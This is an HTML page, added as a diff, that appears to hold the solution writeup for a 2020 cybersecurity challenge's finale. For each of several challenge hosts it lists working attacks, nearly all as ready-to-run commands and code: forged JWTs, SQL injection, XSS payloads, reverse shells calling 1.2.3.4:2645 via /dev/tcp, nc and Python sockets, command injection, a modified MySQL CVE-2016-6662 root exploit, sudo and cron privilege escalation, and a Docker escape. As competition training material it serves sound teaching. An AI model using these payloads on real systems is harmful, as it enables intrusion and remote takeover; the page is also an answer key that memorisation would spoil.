@@ -1,0 +1,303 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width" />
+    <title>Cybersec Challenge 2020 | Solutions</title>
+    <link rel="stylesheet" href="css/main.css" charset="utf-8">
+    <link rel="stylesheet" href="css/solutions.css" charset="utf-8">
+    <script src="js/jquery-3.5.0.min.js" charset="utf-8"></script>
+    <script src="js/main.js" charset="utf-8"></script>
+    <script src="js/solutions.js" charset="utf-8"></script>
+  </head>
+  <body>
+    <div id="main">
+      <p class="intro">In what follows an IP address of <code>1.2.3.4</code> and port number <code>2645</code> are used<br>for reverse shell examples. Substitute as appropriate.</p>
+
+      <h2 id="unencrypted-ssh-private-key">Unencrypted SSH private key</h2>
+      <h3 id="for-tickets">For tickets</h3>
+      <p>There is an unencrypted SSH key on <code>api</code> in <code>~ec2-user/.ssh/tickets_id_rsa</code> which is authorised to login on <code>tickets</code> as <code>ec2-user</code>.</p>
+
+      <h2 id="lack-of-authorisation">Lack of authorisation</h2>
+      <h3 id="on-api">On api</h3>
+      <p>Very few calls to <code>/api</code> validate user privilege, so any user can modify any other user or ticket.</p>
+
+      <h2 id="jwt-signature-not-verified">JWT signature not verified</h2>
+      <h3 id="on-admin">On admin</h3>
+      <ol>
+      <li><p>Go to <a href="https://jwt.io/">jwt.io</a> and create a new JWT token for an admin user:</p>
+      <p> Header:</p>
+      <pre><code>{
+    &quot;alg&quot;: &quot;HS256&quot;,
+    &quot;typ&quot;: &quot;JWT&quot;
+}</code></pre><p> Payload:</p>
+      <pre><code>{
+    &quot;sub&quot;: &quot;aura&quot;,
+    &quot;exp&quot;: 9999999999,
+    &quot;iat&quot;: 1516239022
+}</code></pre></li>
+      <li><p>Just use it, the signature can be whatever.</p>
+      </li>
+      </ol>
+
+      <h2 id="jwt-key-confusion">JWT key confusion</h2>
+      <h3 id="on-admin-1">On admin</h3>
+      <p>Note that the signature of the JWT is not verified at all at first (another vulnerability), so you can trivially login as an admin. If that has been fixed, then key confusion attack is possible.</p>
+      <ol>
+      <li><p>Retrieve the public key used:</p>
+      <pre><code>curl -s -x socks5://localhost:2872 https://</code><span class="placeholder"><code>TARGET</code></span><code>.cybersecuritychallenge-finale.nz/admin/.well-known/jwks.json</code></pre></li>
+      <li><p>Copy the <code>n</code> value, which is the Base64 of the RSA key modulus and replace the URI-safe charset of Base64 with the traditional charset of Base64:</p>
+      <pre><code>res=$(sed &#39;s/-/+/g;s/_/\//g&#39; &lt;&lt;&lt;&quot;</code><span class="placeholder"><code>BASE64 OF MODULUS</code></span><code>&quot;)
+n=$(( 4 - (${#res} % 4) ))
+echo -n &quot;${res}&quot;; printf &quot;%0.s=&quot; $(seq 1 $n);</code></pre></li>
+      <li><p>Paste the output from above into the &quot;Modulus&quot; part of <a href="https://superdry.apphb.com/tools/online-rsa-key-converter">this XML to PEM online converter</a> (the exponent is the same as the default one, AQAB), and save the PEM key as <code>key.pem</code>. Make sure there is a <code>\n</code> at the end, but no blank line.</p>
+      </li>
+      <li><p>Go to <a href="https://jwt.io/">jwt.io</a> and create a new JWT token for an admin user:</p>
+      <p> Header:</p>
+      <pre><code>{
+  &quot;alg&quot;: &quot;HS256&quot;,
+  &quot;typ&quot;: &quot;JWT&quot;
+}</code></pre><p> Payload:</p>
+      <pre><code>{
+  &quot;sub&quot;: &quot;aura&quot;,
+  &quot;exp&quot;: 9999999999,
+  &quot;iat&quot;: 1516239022
+}</code></pre></li>
+      <li><p>In the &quot;Verify signature&quot; section tick &quot;secret base64 encoded&quot; and replace &quot;your-256-bit-secret&quot; with the Base64 of the public key (exactly as is):</p>
+      <pre><code>base64 &lt; key.pem</code></pre></li>
+      <li><p>Copy the resigned token and use it :)</p>
+      </li>
+      </ol>
+
+      <h2 id="sqli">SQLi</h2>
+      <h3 id="on-api-via-injection">On api via injection</h3>
+      <p>Every api request is vulnerable to SQLi, such as:</p>
+      <pre><code>curl -s -x socks5://localhost:2872 &#39;https://</code><span class="placeholder"><code>TARGET</code></span><code>.cybersecuritychallenge-finale.nz/api/tickets/XXX&quot; UNION SELECT hash, 2, 3, 4 FROM auth JOIN users ON users.id = auth.id WHERE users.username = &quot;</code><span class="placeholder"><code>TARGET</code></span><code>&#39; -H &#39;Cookie: authorization=</code><span class="placeholder"><code>COOKIE</code></span><code>&#39;</code></pre><p>The password hash is in the <code>id</code> parameter ;)</p>
+
+      <h3 id="on-api-via-the-sql-box">On api via the SQL box</h3>
+      <p>There is an SQL box that admins can see and use on the frontend.</p>
+      <pre><code>curl -s -x socks5://localhost:2872 &#39;https://</code><span class="placeholder"><code>TARGET</code></span><code>.cybersecuritychallenge-finale.nz/api/admin/sqlbox&#39; -H &#39;Cookie: authorization=</code><span class="placeholder"><code>COOKIE</code></span><code>&#39; -d &#39;query=select @@version&#39;</code></pre><h2 id="xss">XSS</h2>
+
+      <h3 id="on-admin-via-a-message">On admin via a message</h3>
+      <p>Submit a ticket with the following title or message:</p>
+      <pre><code>&lt;script&gt;</code><span class="placeholder"><code>YOUR XSS TOKEN</code></span><code>=1&lt;/script&gt;</code></pre>
+
+      <h3 id="on-tickets-via-a-message">On tickets via a message</h3>
+      <p>Submit a ticket with the following message:</p>
+      <pre><code>&lt;details ontoggle="</code><span class="placeholder"><code>YOUR XSS TOKEN</code></span><code>=1" open&gt;</code></pre>
+
+      <h3 id="on-tickets-via-patch-notes">On tickets via patch notes</h3>
+      <p>Add a patch note (by exploiting SQLi or authorisation issues) with the following as the message:</p>
+      <pre><code>&lt;details ontoggle="</code><span class="placeholder"><code>YOUR XSS TOKEN</code></span><code>=1" open&gt;</code></pre>
+
+      <h2 id="rce">RCE</h2>
+      <h3 id="on-api-via-captcha">On api via CAPTCHA</h3>
+      <pre><code>exp=&quot;var Promise = require(&#39;bluebird&#39;); var execAsync = Promise.promisify(require(&#39;child_process&#39;).exec); execAsync(&#39;bash -c \\\&quot;script -qef /dev/null &gt;&amp; /dev/tcp/1.2.3.4/2645 0&gt;&amp;1\\\&quot;&#39;);&quot;
+
+for i in {0..10} ; do
+    curl -s -x socks5://localhost:2872 -X POST \
+        &#39;https://</code><span class="placeholder"><code>TARGET</code></span><code>.cybersecuritychallenge-finale.nz/api/users/login&#39; \
+        -H &#39;Content-Type: application/json&#39; \
+        --data &#39;{&quot;captcha&quot;: {&quot;q&quot;:&quot;number&quot;,&quot;a&quot;:&quot;&#39;&quot;${exp}&quot;&#39;&quot;}}&#39;
+done</code></pre>
+
+      <h3 id="on-api-via-the-python-box">On api via the Python box</h3>
+      <p>There is a python box that admins can see and use.</p>
+      <pre><code>curl -s -x socks5://localhost:2872 &#39;https://</code><span class="placeholder"><code>TARGET</code></span><code>.cybersecuritychallenge-finale.nz/api/admin/python&#39; -H &#39;Cookie: authorization=</code><span class="placeholder"><code>COOKIE</code></span><code>&#39; -d &#39;code=import sys; print(sys.version_info)&#39;</code></pre>
+
+      <h3 id="on-api-via-file-upload-version-1">On api via file upload: version 1</h3>
+      <p>Using a <code>node.js</code> file.</p>
+      <ol>
+      <li><p>Create a file with the following contents named <code>whatever.jpg</code>:</p>
+      <pre><code>let a=require(&quot;util&quot;),b=a.promisify(require(&quot;child_process&quot;).exec);b(&quot;bash -c &#39;script -qef &gt;&amp; /dev/tcp/1.2.3.4/2645 0&gt;&amp;1&#39;&quot;).catch(()=&gt;{});</code></pre></li>
+      <li><p>Upload it:</p>
+      <pre><code>curl -s -x socks5://localhost:2872 &#39;https://</code><span class="placeholder"><code>TARGET</code></span><code>.cybersecuritychallenge-finale.nz/api/users/image&#39; -H &#39;Cookie: authorization=</code><span class="placeholder"><code>COOKIE</code></span><code>&#39; -d &quot;filename=../whatever.jpg.js&amp;blob=`cat whatever.jpg | base64 | sed &#39;s/+/%2D/g; s/\//%2F/g; s/=/%3D/g&#39;`&quot;</code></pre></li>
+      </ol>
+
+      <h3 id="on-api-via-file-upload-version-2">On api via file upload: version 2</h3>
+      <p>Using a file with bash escape characters in the filename.</p>
+      <ol>
+      <li><p>Base64 your reverse shell payload like such:</p>
+      <pre><code>echo -n &quot;script -qef &gt;&amp; /dev/tcp/1.2.3.4/2645 0&gt;&amp;1&quot; | base64</code></pre></li>
+      <li><p>Upload an image with a bach command in the filename which decodes and runs it:</p>
+      <pre><code>curl -s -x socks5://localhost:2872 &#39;https://</code><span class="placeholder"><code>TARGET</code></span><code>.cybersecuritychallenge-finale.nz/api/users/image&#39; -H &#39;Cookie: authorization=</code><span class="placeholder"><code>COOKIE</code></span><code>&#39; -d &#39;filename=../asdf$(bash -c &quot;$(echo </code><span class="placeholder"><code>MY BASE64 PAYLOAD</code></span><code> | base64 -d)&quot;).png.js&amp;blob=asdf&#39;</code></pre></li>
+      </ol>
+
+      <h3 id="on-api-via-ftp">On api via FTP</h3>
+      <p>You first need a shell on another host.</p>
+      <ol>
+      <li><p>On one of the hosts, put <code>lftp</code></p>
+      <ul>
+      <li><p>If <code>root</code>, just install it:</p>
+      <pre><code>apt-get install lftp</code></pre><p>or</p>
+      <pre><code>yum install lftp</code></pre></li>
+      <li><p>Otherwise if non-root, download it to <code>/tmp</code>:</p>
+      <pre><code>cd /tmp
+apt download lftp
+dpkg-deb -x lftp_</code><span class="placeholder"><code>VERSION</code></span><code>_amd64.deb lftp</code></pre><p>check with:</p>
+      <pre><code>./lftp/usr/bin/lftp</code></pre></li>
+      </ul>
+      </li>
+      <li><p>Create a reverse shell file for node.js:</p>
+      <p> <code>some_random_name.js</code>:</p>
+      <pre><code>var Promise = require(&#39;bluebird&#39;);
+var execAsync = Promise.promisify(require(&#39;child_process&#39;).exec);
+execAsync(&quot;bash -c &#39;script -qef &gt;&amp; /dev/tcp/1.2.3.4/2645 0&gt;&amp;1&#39;&quot;);</code></pre></li>
+      <li><p>Drop a node.js file in <code>anon</code> (which is actually the root of the node.js API):</p>
+      <pre><code>lftp -c &#39;open api; user ftp &quot;&quot;; cd anon; put some_random_name.js&#39;</code></pre></li>
+      </ol>
+
+      <h3 id="on-validator-via-command-injection">On validator via command injection</h3>
+      <ol>
+      <li><p>Submit a ticket with the following link in the body:</p>
+      <p> Version 1:</p>
+      <pre><code>https://&#39;    &#39;&#39;    whatever;    bash    -c    &#39;s=$(printf    \\x2f);    target=${s}dev${s}tcp${s}1.2.3.4${s}2645;    script    -qef    &gt;&amp;    $target    0&gt;&amp;1    &amp;    sleep    1;    disown    -h    %%&#39;;    awk    -v    link=&#39;</code></pre><p> Version 2 (needs <code>nc</code> installed in the docker container):</p>
+      <pre><code>https://&#39;    &#39;&#39;    whatever;    bash    -c    &#39;cd    $(printf    \\x2f)tmp;    rm    -f    myf;    mkfifo    myf;    cat    myf    |    script    -qef    2&gt;&amp;1    |    nc    1.2.3.4    2645    &amp;&gt;myf    &amp;    sleep    1;    disown    -h    %%&#39;;    awk    -v    link=&#39;</code></pre><p> Note that the above has only tabs, no spaces! I.e.:</p>
+      <pre><code>https://&#39;</code><span class="placeholder"><code>TAB</code></span><code>&#39;&#39;</code><span class="placeholder"><code>TAB</code></span><code>whatever;</code><span class="placeholder"><code>TAB</code></span><code>... </code></pre><p> This is because the <code>/admin/js/main.js</code> extracts hostnames from links based on the regex <code>/https?:\/\/[^\/ ]+/g</code>, stopping at a slash or space (but not tab).</p>
+      </li>
+      <li><p>Start a listener on <code>2645</code>:</p>
+      <pre><code>nc -l 1.2.3.4 2645</code></pre><p> Wait for an admin (i.e. our automated checker) to view the tickets :)</p>
+      </li>
+      </ol>
+
+      <h3 id="on-admin-via-log-injection">On admin via log injection</h3>
+      <ol>
+      <li><p>Write a simple reverse shell that we&#39;ll use as a hook:</p>
+      <pre><code>def revshell_myname_or_random_str():
+import socket
+import subprocess
+import os
+
+pid = os.fork()
+if pid != 0:
+   return
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(120)
+s.connect((&quot;1.2.3.4&quot;, 2645))
+while True:
+    s.send(b&#39;$ &#39;)
+    cmd = s.recv(256 * 1024).decode(&#39;utf-8&#39;).strip(&#39;\n&#39;).strip(&#39;\r&#39;)
+    if not cmd or cmd == &#39;exit&#39;:
+        break
+    res = subprocess.check_output(
+        &#39;{}; exit 0&#39;.format(cmd),
+        stderr=subprocess.STDOUT,
+        shell=True)
+    s.send(res)
+s.close()</code></pre></li>
+      <li><p>Send it as is (raw data) in the body of a request (doesn&#39;t need to be a valid or authorised request), so it gets written to the log file:</p>
+      <pre><code>curl -s -x socks5://localhost:2872 -F data=\@/path/to/revshell.py &#39;https://</code><span class="placeholder"><code>TARGET</code></span><code>.cybersecuritychallenge-finale.nz/admin/&#39;</code></pre></li>
+      <li><p>Add it as a hook (now you need to be authenticated):</p>
+      <pre><code>curl -s -x socks5://localhost:2872 -X PUT -d &#39;{&quot;path&quot;: &quot;/var/log/tickets/request.log&quot;}&#39; -H &#39;Authorization: Bearer </code><span class="placeholder"><code>JWT</code></span><code>&#39; -H &#39;Content-Type: application/json&#39; &#39;https://</code><span class="placeholder"><code>TARGET</code></span><code>.cybersecuritychallenge-finale.nz/admin/api/hook/revshell_myname_or_random_str&#39;</code></pre></li>
+      <li><p>Start a listener (IPv4):</p>
+      <pre><code>nc -l -4 1.2.3.4 2645</code></pre></li>
+      <li><p>Run the shell, which will connect to your listener:</p>
+      <pre><code>curl -s -x socks5://localhost:2872 -X POST -d &#39;{&quot;hooks&quot;: [&quot;revshell_myname_or_random_str&quot;]}&#39; -H &#39;Authorization: Bearer </code><span class="placeholder"><code>JWT</code></span><code>&#39; -H &#39;Content-Type: application/json&#39; &#39;https://</code><span class="placeholder"><code>TARGET</code></span><code>.cybersecuritychallenge-finale.nz/admin/api/hooks/&#39;</code></pre></li>
+      </ol>
+
+      <h3 id="on-db-via-sqli">On db via SQLi</h3>
+      <p>Using this PoC for <a href="https://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html">2016-6662</a></p>
+      <ul>
+      <li>Download <a href="https://legalhackers.com/exploits/mysql_hookandroot_lib.c">mysql_hookandroot_lib.c</a></li>
+      <li><p>Edit the following lines near the top:</p>
+      <pre><code>--- a/mysql_hookandroot_lib.c    2017-01-14 18:03:20.000000000 +1300
++++ b/mysql_hookandroot_lib.c    2020-06-11 08:56:09.000000000 +1200
+@@ -63,3 +63,3 @@
+-#define ATTACKERS_IP &quot;127.0.0.1&quot;
+-#define SHELL_PORT 6033
+-#define INJECTED_CONF &quot;/var/lib/mysql/my.cnf&quot;
++#define ATTACKERS_IP &quot;1.2.3.4&quot;
++#define SHELL_PORT 2645
++#define INJECTED_CONF &quot;/etc/my.cnf&quot;</code></pre></li>
+      <li><p>Compile it:</p>
+      <pre><code>gcc -fPIC -shared -o mysql_hookandroot_lib.so mysql_hookandroot_lib.c -ldl</code></pre></li>
+      <li><p>Convert it to hex (copy or save for later):</p>
+      <pre><code>xxd -p mysql_hookandroot_lib.so | tr -d \\n &gt; mysql_hookandroot_lib.hex</code></pre></li>
+      <li><p>Start a listener on the port the reverse shell will connect to:</p>
+      <pre><code>nc -l -k 1.2.3.4 2645</code></pre></li>
+      <li><p>Inject the following statements via SQLi:</p>
+      <pre><code>select unhex(&#39;{THE HEX PAYLOAD HERE}&#39;) into dumpfile &#39;/var/lib/mysql/mysql_hookandroot_lib.so&#39;;</code></pre>
+      <pre><code>set global general_log_file=&#39;/etc/my.cnf&#39;;</code></pre>
+      <pre><code>set global general_log = on;</code></pre><p>  Note that the conf setting in the original PoC uses the <code>[mysqld]</code> section and the <code>malloc_lib</code> setting, which doesn&#39;t work, use this:</p>
+      <pre><code>select &quot;
+
+[mysqld_safe]
+malloc-lib=&#39;/var/lib/mysql/mysql_hookandroot_lib.so&#39;
+
+[abyss]
+&quot;;</code></pre>
+      <pre><code>set global general_log = off;</code></pre>
+      <pre><code>shutdown;</code></pre></li>
+      <li><p>Wait for your shell ;)</p>
+      </li>
+      </ul>
+
+      <h2 id="privesc">Privesc</h2>
+      <h3 id="on-api-via-apt">On api via apt</h3>
+      <ol>
+      <li><p>After getting a shell, run</p>
+      <pre><code>sudo apt-get update -o APT::Update::Pre-Invoke::=&quot;/bin/bash -i&quot;</code></pre></li>
+      </ol>
+
+      <h3 id="on-validator-via-more">On validator via more</h3>
+      <ol>
+      <li>After getting a shell (see <a href="#on-validator-via-command-injection">RCE on validator via command injection</a>), upgrade it to an interactive one via <code>script -qef</code>.</li>
+      <li>Make the terminal window very short (5 lines should be small enough).</li>
+      <li>Run <code>sudo more /var/log/php7.3-fpm.log</code> (inside the <code>script</code> session).</li>
+      <li>If the terminal is shorter than the number of lines in the file, a &quot;More&quot; prompt will appear at the bottom. Now you can type <code>!bash</code> to get a <code>root</code> shell.</li>
+      </ol>
+
+      <h3 id="on-tickets-via-cron">On tickets via cron</h3>
+      <p>All hosts have a cron job which runs <code>/infosec-tip.sh</code> every minute. The script is owned by <code>ec2-user</code> and writable to it.</p>
+      <pre><code>echo &quot;bash -c &#39;script -qef &gt;&amp; /dev/tcp/1.2.3.4/2645 0&gt;&amp;1 &amp; sleep 1; disown -h %%&#39;&quot; &gt; /infosec-tip.sh</code></pre>
+
+      <h2 id="docker-escape">Docker escape</h2>
+      <ol>
+      <li><p>Get the docker client (by installing it from the distro&#39;s repositories if available, or downloading it from somewhere else). Otherwise, you need <code>python</code>.</p>
+      <hr>
+      <p> Case 1: use <code>python</code> (examples given for <code>python3</code>)</p>
+      <ul>
+      <li>do <code>apt install python3-pip</code></li>
+      <li>do <code>pip3 install docker</code>, see <a href="https://github.com/docker/docker-py">docker-py</a></li>
+      <li><p>start an interactive privileged container</p>
+      <ul>
+      <li><p>do <code>pip3 install dockerpty</code>, see <a href="https://github.com/d11wtq/dockerpty">dockerpty</a>, and then:</p>
+      <pre><code>python3 -c &#39;
+import docker, dockerpty
+client = docker.from_env()
+container = client.images.pull(&quot;busybox:latest&quot;)
+container = client.containers.create(
+    image=&quot;busybox:latest&quot;,
+    stdin_open=True,
+    tty=True,
+    privileged=True,
+    command=&quot;/bin/sh&quot;)
+dockerpty.start(
+    client.api,
+    container.id)&#39;</code></pre></li>
+      </ul>
+      </li>
+      </ul>
+      <hr>
+      <p> Case 2: <a href="https://docs.docker.com/engine/install/ubuntu/#install-from-a-package">use the binary package</a></p>
+      <ul>
+      <li>do <code>apt install wget</code></li>
+      <li><p>download the package for the distro, e.g. if Debian buster do:</p>
+      <pre><code>wget https://download.docker.com/linux/debian/dists/buster/pool/stable/amd64/docker-ce-cli_19.03.8~3-0~debian-buster_amd64.deb</code></pre></li>
+      <li><p>extract it:</p>
+      <pre><code>dpkg -x docker-ce-cli_19.03.8~3-0~debian-buster_amd64.deb docker-cli</code></pre></li>
+      <li><p>start an interactive privileged container:</p>
+      <pre><code>docker-cli/usr/bin/docker run --privileged --rm -ti busybox sh</code></pre></li>
+      </ul>
+      </li>
+      <li><p>Now that we&#39;re inside a privileged container, escape to host system as <code>root</code>:</p>
+      <pre><code>/ # mkdir /rootfs
+/ # mount /dev/xvda1 /rootfs/
+/ # chroot /rootfs/
+[root@13fb63b08b9b /]# source /etc/profile</code></pre></li>
+      </ol>
+    </div>
+  </body>
+</html>
+
